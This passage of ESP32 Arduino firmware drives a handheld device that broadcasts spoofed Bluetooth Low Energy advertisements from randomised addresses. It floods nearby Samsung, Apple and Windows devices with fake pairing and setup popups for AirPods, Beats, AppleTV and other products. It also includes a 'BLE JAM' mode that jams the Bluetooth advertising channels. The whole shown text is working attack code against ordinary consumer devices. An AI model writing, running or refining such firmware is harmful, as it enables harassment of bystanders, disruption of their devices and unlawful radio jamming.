  attack_state = 1;
}

void SamsungBudsSpam() {
  device_choice = 1;
  device_index = random(sizeof(SHORT_DEVICES2) / sizeof(SHORT_DEVICES2[0]));
  attack_state = 1;
}

void SamsungRandomSpam() {
  device_choice = 2;
  attack_state = 1;
}

void SamsungWatch6UltraSpam() {
  device_choice = 3;
  attack_state = 1;
}

void handleSpam() {
  if (identification == 1) {
    display.clearDisplay();
    display.drawRoundRect(14, 15, 100, 34, 4, SSD1306_WHITE);
    display.setTextSize(1);
    display.setCursor(22, 22);
    display.println(F("SENDING..."));
    display.setCursor(22, 35);
    display.println(F("Samsung Spam"));
    display.display();

    if (spam_count > 14) spam_count = 1;

    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    for (int i = 0; i < 6; i++) {
      dummy_addr[i] = random(256);
    }
    dummy_addr[0] = (dummy_addr[0] & 0xFE) | 0x02;

    switch(spam_count) {
      case 1:
      case 2:
      case 3:
      case 4:
      case 5:
      case 6:
      case 7:
        device_choice = 0;
        break;
      case 8:
      case 9:
      case 10:
        device_choice = 1;
        break;
      case 11:
      case 12:
        device_choice = 2;
        break;
      case 13:
      case 14:
        device_choice = 3;
        break;
    }

    BLEAdvertisementData oAdvertisementData = getSamsungAdvertisementData();

    pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
    pAdvertising->setAdvertisementData(oAdvertisementData);

    pAdvertising->setMinInterval(0x20);
    pAdvertising->setMaxInterval(0x20);
    pAdvertising->setMinPreferred(0x20);
    pAdvertising->setMaxPreferred(0x20);

    pAdvertising->start();
    delay(delayMilliseconds);
    pAdvertising->stop();

    Serial.printf("Samsung Watch Spam | MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                  dummy_addr[0], dummy_addr[1], dummy_addr[2],
                  dummy_addr[3], dummy_addr[4], dummy_addr[5]);

    spam_count++;
  }
  if (identification == 2) {
    display.clearDisplay();
    display.drawRoundRect(14, 15, 100, 34, 4, SSD1306_WHITE);
    display.setTextSize(1);
    display.setCursor(22, 22);
    display.println(F("SENDING..."));
    display.setCursor(22, 35);
    display.println(F("Apple Pair"));
    display.display();
    if (spam_count == 31) spam_count = 1;
    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    for (int i = 0; i < 6; i++) {
      dummy_addr[i] = random(256);
      if (i == 0) {
        dummy_addr[i] |= 0xF0;
      }
    }

    if (spam_count == 1) Airpods();
    if (spam_count == 2) Airpods_pro();
    if (spam_count == 3) Airpods_Max();
    if (spam_count == 4) Airpods_Gen_2();
    if (spam_count == 5) Airpods_Gen_3();
    if (spam_count == 6) Airpods_Pro_Gen_2();
    if (spam_count == 7) Power_Beats();
    if (spam_count == 8) Power_Beats_Pro();
    if (spam_count == 9) Beats_Solo_Pro();
    if (spam_count == 10) Beats_Studio_Buds();
    if (spam_count == 11) Beats_Flex();
    if (spam_count == 12) Beats_X();
    if (spam_count == 13) Beats_Solo_3();
    if (spam_count == 14) Beats_Studio_3();
    if (spam_count == 15) Beats_Studio_Pro();
    if (spam_count == 16) Betas_Fit_Pro();
    if (spam_count == 17) Beats_Studio_Buds_Plus();
    if (spam_count == 18) AppleTV_Setup();
    if (spam_count == 19) AppleTV_Pair();
    if (spam_count == 20) AppleTV_New_User();
    if (spam_count == 21) AppleTV_AppleID_Setup();
    if (spam_count == 22) AppleTV_Wireless_Audio_Sync();
    if (spam_count == 23) AppleTV_Homekit_Setup();
    if (spam_count == 24) AppleTV_Keyboard_Setup();
    if (spam_count == 25) AppleTV_Connecting_to_Network();
    if (spam_count == 26) Homepod_Setup();
    if (spam_count == 27) Setup_New_Phone();
    if (spam_count == 28) Transfer_Number();
    if (spam_count == 29) TV_Color_Balance();
    if (spam_count == 30) Apple_Vision_Pro();

    
    BLEAdvertisementData oAdvertisementData = getAdvertismentData();

    pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
    pAdvertising->addServiceUUID(device_uuid);
    pAdvertising->setAdvertisementData(oAdvertisementData);

    pAdvertising->setMinInterval(0x20);
    pAdvertising->setMaxInterval(0x20);
    pAdvertising->setMinPreferred(0x20);
    pAdvertising->setMaxPreferred(0x20);
    
    pAdvertising->start();
    delay(delayMilliseconds);
    pAdvertising->stop();
    spam_count += 1;
  }
  if (identification == 3) {
    display.clearDisplay();
    display.drawRoundRect(14, 15, 100, 34, 4, SSD1306_WHITE);
    display.setTextSize(1);
    display.setCursor(22, 22);
    display.println(F("SENDING..."));
    display.setCursor(22, 35);
    display.println(F("Airpods Pair"));
    display.display();
    if (spam_count == 7) spam_count = 1;
    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    for (int i = 0; i < 6; i++) {
      dummy_addr[i] = random(256);
      if (i == 0) {
        dummy_addr[i] |= 0xF0;
      }
    }

    if (spam_count == 1) Airpods();
    if (spam_count == 2) Airpods_pro();
    if (spam_count == 3) Airpods_Max();
    if (spam_count == 4) Airpods_Gen_2();
    if (spam_count == 5) Airpods_Gen_3();
    if (spam_count == 6) Airpods_Pro_Gen_2();
    
    BLEAdvertisementData oAdvertisementData = getAdvertismentData();

    pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
    pAdvertising->addServiceUUID(device_uuid);
    pAdvertising->setAdvertisementData(oAdvertisementData);

    pAdvertising->setMinInterval(0x20);
    pAdvertising->setMaxInterval(0x20);
    pAdvertising->setMinPreferred(0x20);
    pAdvertising->setMaxPreferred(0x20);
    
    pAdvertising->start();
    delay(delayMilliseconds);
    pAdvertising->stop();
    spam_count += 1;
  }
  if (identification == 4) {
    display.clearDisplay();
    display.drawRoundRect(14, 15, 100, 34, 4, SSD1306_WHITE);
    display.setTextSize(1);
    display.setCursor(22, 22);
    display.println(F("SENDING..."));
    display.setCursor(22, 35);
    display.println(F("BLE JAM"));
    display.display();
    int ch = bleChannels[currentChannel];
    jamWiFiChannel(ch);
    
    currentChannel = (currentChannel + 1) % 3;
    Serial.printf("CH %d → BLE %d MHz\n", ch, 2402 + (currentChannel == 0 ? 0 : currentChannel == 1 ? 24 : 78));
  }
  if (identification == 5) {
    display.clearDisplay();
    display.drawRoundRect(14, 15, 100, 34, 4, SSD1306_WHITE);
    display.setTextSize(1);
    display.setCursor(22, 22);
    display.println(F("SENDING..."));
    display.setCursor(22, 35);
    display.println(F("Windows Spam"));
    display.display();
    unsigned long now = millis();
    if (now - lastAdv > delayMs) {
      sendMsSpam();
      lastAdv = now;
      
      static int counter = 0;
      counter++;
      if (counter >= 60) {
          delayMs = 200;
          counter = 0;
          Serial.printf("Neue Verzögerung: %d ms\n", delayMs);
      }
    }
  }
  if (digitalRead(SubmitbuttonPin) == LOW) {
    preferences.putInt("mode", 0);
    preferences.putInt("idt", 0);
    preferences.end();
    delay(500);
    ESP.restart();
  }
}